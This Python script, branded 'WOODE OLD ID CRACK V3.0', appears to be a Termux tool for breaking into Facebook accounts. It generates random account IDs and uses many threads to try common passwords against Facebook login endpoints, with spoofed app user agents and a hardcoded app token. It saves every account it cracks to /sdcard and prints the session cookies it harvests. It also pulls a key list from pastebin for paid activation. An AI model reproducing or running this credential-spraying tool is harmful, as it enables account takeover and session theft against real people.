import os
import random
import sys
import subprocess
import time, uuid
from io import BytesIO

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")

try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")

from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []
#-----------------------------[APPROVAL KEY]-----------------------------------#
a = str(os.geteuid())
b = str(os.geteuid())
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
x = (a+build+b).upper().replace(".","")
z = "X".join(x)
keys = z[15:]

appx_buffer = BytesIO()
appx_curl = pycurl.Curl()
appx_curl.setopt(pycurl.URL, "https://pastebin.com/raw/gkD83bzg")
appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
appx_curl.perform()
appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
raw = "".join(appx_data)

#----------------------------[USER/AGENT]-----------------------------------#
def sm():
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', 
        '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 'SM-J250F', 
        'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 
        'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid', 
        'com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android', 
        'com.facebook.mlite|MessengerLite'])
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
          f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};'
          f'FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density={str(random.choice(range(1, 4)))}.0,width={str(random.choice(range(720, 1500)))}'
          f',height={str(random.choice(range(1500, 2000)))};FB_FW/1;]')
    return ua
    

def ug1():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.0.0; moto e5 plus Build/OPPS27.91-179-8-16) '
          f'[FBAN/FB4A;FBAV/{fb_v1}.0.0.50.{fb_v2};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{rdp1};'
          f'FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{andv}.0.0;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]')
    return ua

def ug2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.1.1; vivo V3Max Build/LMY47V) '
          f'[FBAN/Orca-Android;FBAV/{fb_v1}.0.0.16.{fb_v2};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rdp1};'
          f'FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andv}.1.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=3.0,width=1080,height=1920}}')
    return
#----------------------------[LOGO]-----------------------------------#
logo = f"""{g}
╭╮╭╮╭┳━━━┳━━━┳━━━┳━━━╮
┃┃┃┃┃┃╭━╮┃╭━╮┣╮╭╮┃╭━━╯
┃┃┃┃┃┃┃╱┃┃┃╱┃┃┃┃┃┃╰━━╮
┃╰╯╰╯┃┃╱┃┃┃╱┃┃┃┃┃┃╭━━╯
╰╮╭╮╭┫╰━╯┃╰━╯┣╯╰╯┃╰━━╮
╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━╯ 
{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{w}
TOOL BY       {r}:{w} WOODE
TOOL TYPE     {r}:{w} OLD ID CRACK {r}[{g}V3.0{r}]
TOOL STATUS   {r}:{w} \x1b[0;45mPREMIUM\x1b[0;91m{w}
YOUR KEY      {r}:{g} {keys}
{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═━═━══━═━═━══━═━═"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user = []
    os.system("clear")
    print(logo)
    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
    lin()
    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2011{r}-{w}2014{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2009{r}-{w}2010{g}]")
    lin()
    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}A{r}]")
    print(f"{g}[{r}2{g}] {w}METHOD {r}[{g}B{r}]{g}")
    lin()
    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
    lin()
    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    if "1" in cspd:
        speedx = 45
    else:
        speedx = 30
        
    if ask in ["1"]:
        sv = f"{g}[{w}2011{r}-{w}2014{g}]"
        star = "10000"
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        sv = f"{g}[{w}2008{r}-{w}2010{g}]"
        star = "100000"
        for i in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=speedx) as samira:
        tl = str(limit)
        os.system('clear')
        print(logo)
        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
        lin()
        for mal in user:
            uid = star + mal
            if mtd_opt in ["1", "A"]:
                samira.submit(login, uid, tl)
            elif mtd_opt in ["2", "B"]:
                samira.submit(login1, uid, tl)
            else:
                samira.submit(login, uid, tl)
    print("")
    lin()
    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
    lin()
    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
    sys.exit()
#----------------------------[METHOD 1]-----------------------------------#
def login(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ {g}WOODE{r}-{g}X {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ug2(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            rp = requests.get(url, headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/WOODE-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/WOODE-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
#----------------------------[METHOD 2]-----------------------------------#
def login1(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ {g}WOODE{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:

            url = 'https://graph.facebook.com/auth/login'

            headers = {
                'User-Agent': ug1(),
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(11111,66666)),
                'X-FB-SIM-HNI': str(random.randint(11111,66666)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            rp = requests.post(url, headers=headers, data=data).json()
            if "session_key" in rp:
                cookie = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                try:
                    print(f"\r\r{r}[{g}COOKIES 🍪{r}]{p}➤ {w}{cookie}")
                    lin()
                except(KeyError, IOError):
                    pass
                open("/sdcard/JSON-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/WOODE-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
#----------------------------[APPROVAL]-----------------------------------#
def approval():
    global keys, raw
    if keys in raw:
        os.system("clear")
        print(logo)
        print(f"{g}[{r}~{g}] {w}YOUR KEY IS APPROVED")
        lin()
        time.sleep(1)
        main()
    else:
        os.system("clear")
        print(logo)
        print(f"{g}[{r}~{g}] {w}YOUR KEY IS NOT APPROVED")
        print(f"{g}[{r}~{g}] {w}PLEASE CONTACT TOOL OWNER FOR ACTIVATION{g}")
        lin()
        input(f"{g}[{r}~{g}] {w}PRESS ENTER TO SEND KEY TOOL OWNER")
        os.system("xdg-open https://www.facebook.com/mdshahmakhdum.shajon?mibextid=ZbWKwL")
        sys.exit()
main()
#----------------------------[CODE/END]-----------------------------------#